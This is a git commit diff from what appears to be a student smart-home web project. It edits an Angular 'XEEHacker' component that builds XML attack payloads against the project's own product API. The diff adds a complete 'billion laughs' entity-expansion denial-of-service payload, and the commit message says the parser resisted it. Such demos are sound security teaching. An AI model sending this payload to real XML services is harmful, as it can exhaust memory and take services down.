a69c50bb7b56d5f3895e2042a63f520c08220a6d
99818fhwn <99818@fhwn.ac.at>
2019-06-12 02:29:19 +0200

    added bilion lol'S does not work xml parser to smart

--- webserver/SmartHomeUI/src/app/xeehacker/xeehacker.component.ts
+++ webserver/SmartHomeUI/src/app/xeehacker/xeehacker.component.ts
@@ -41,32 +41,33 @@ export class XEEHackerComponent implements OnInit {
       + "</product>"
       + "</root>"
 
-    // let body2 =
-    //   `<!DOCTYPE root [
-    //   <!ENTITY lol "lol" >
-    //   <!ELEMENT lolz(#PCDATA) >
-    //   <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;" >
-    //   <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;" >
-    //   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;" >
-    //   <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;" >
-    //   <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;" >
-    //   <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;" >
-    //   <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;" >
-    //   <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;" >
-    //   <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;" >
-    //   ]>`
-    //   + "<root>"
-    //   + "<product>"
-    //   + "<id>&own;</id>"
-    //   + "<fridge_id>1</fridge_id>"
-    //   + "<start_weight>1</start_weight>"
-    //   + "<current_weight>1</current_weight>"
-    //   + "<expire_date>2</expire_date>"
-    //   + "</product>"
-    //   + "</root>"
+    let billionlaughs =
+      "<?xml version = \"1.0\" encoding =\"UTF-8\"?>" +
+      `<!DOCTYPE root [
+      <!ENTITY lol "lol">
+      <!ELEMENT root (#PCDATA)>
+      <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+      <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+      <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+      <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+      <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+      <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+      <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+      ]>`
+      + "<root>"
+      + "<product>"
+      + "<id>&lol9;</id>"
+      + "<fridge_id>1</fridge_id>"
+      + "<start_weight>1</start_weight>"
+      + "<current_weight>1</current_weight>"
+      + "<expire_date>2</expire_date>"
+      + "</product>"
+      + "</root>"
 
 
-    this.xxePayload = body2;
+    this.xxePayload = body;
 
     this.xxePlainCode = `
       <?xml version = \"1.0\" encoding =\"UTF-8\"?>
